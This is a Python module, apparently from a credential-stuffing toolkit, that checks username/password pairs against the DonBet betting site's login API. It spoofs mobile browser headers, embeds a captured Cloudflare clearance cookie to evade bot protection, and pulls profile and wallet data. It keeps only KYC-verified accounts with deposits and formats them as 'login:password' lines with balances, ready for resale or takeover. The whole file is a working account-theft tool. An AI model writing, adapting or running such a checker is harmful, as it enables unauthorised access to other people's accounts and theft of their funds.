from core.base_checker import BaseChecker
from typing import Dict, Any
import requests

class DonbetChecker(BaseChecker):
    """DonBet site checker"""
    
    LOGIN_URL = "https://m.donbet.com/api/profile/login"
    PROFILE_URL = "https://m.donbet.com/api/profile/p/getprofile"
    WALLET_URL = "https://m.donbet.com/api/profile/p/getwallets"
    
    HEADERS = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
  'sec-ch-ua-mobile': "?1",
  'recaptchaiitl8n8t': "undefined",
  'sec-ch-ua-arch': "\"\"",
  'sec-ch-ua-full-version': "\"139.0.7339.0\"",
  'sec-ch-ua-platform-version': "\"15.0.0\"",
  'useraction': "",
  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
  'sec-ch-ua-bitness': "\"\"",
  'sec-ch-ua-model': "\"2310FPCA4G\"",
  'sec-ch-ua-platform': "\"Android\"",
  'origin': "https://m.donbet.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://m.donbet.com/en/static/login",
  'accept-language': "en-US,en;q=0.9",
  'Cookie': "cf_clearance=BD0mne4nInPwQvuFmYErgkWu85zrPUFgDy4.S6ZXw1Y-1768662097-1.2.1.1-AD0AUuWL6E17CGtrNbDXVUKBzWoAAEGUNhSeqtkIYvfnW3Vxir0DAkOHe3xnvFqQ_iTN5_4zIorJFs2hDFGunR2.IvCtW9oiBBsOxcWOd66f9sckYfh4zOSQ_EMHzltg1vptLOA.F1kiZ6C8aRjZ43lnb3X3z6MVpkBtbCX4238DS8QXORhFpjze8DWFl4E6EXHfI4OE5jFFtOEDd.o2HHC_lit7FLPdfgOO6RWbmz4; language=fr; _ga=GA1.1.75795595.1768662100; _fbp=fb.1.1768662101720.236872554428681048; _ga_3WJE88DYKP=GS2.1.s1768662100$o1$g1$t1768662105$j55$l0$h0"
}
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single DonBet account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # Login
            payload = {"UserName": username, "Password": password, "ConfirmationStatus": None}
            resp = session.post(self.LOGIN_URL, json=payload, timeout=15)
            
            if resp.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = resp.json()
            if data.get("status") != 1:
                return {"status": "bad", "username": username}

            # Get profile and wallet
            profile = session.get(self.PROFILE_URL, timeout=15).json()
            wallet = session.get(self.WALLET_URL, timeout=15).json()
            wallet_info = wallet[0] if wallet else {}

            kyc_status = profile.get("KYCStatus", False)
            deposited_before = profile.get("Deposited", False)
            
            account_data = {
                "login": username,
                "password": password,
                "kyc_status": kyc_status,
                "deposited_before": deposited_before,
                "balance": wallet_info.get("Balance", 0),
                "email": data.get("response", {}).get("Email", ""),
                "country": profile.get("CountryId", "")
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """Save if KYC verified AND deposited"""
        return account_data.get("kyc_status", False) and account_data.get("deposited_before", False)
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """Format DonBet account data"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"kyc_status={account_data['kyc_status']} | " \
               f"deposited_before={account_data['deposited_before']} | " \
               f"balance={account_data['balance']}\n"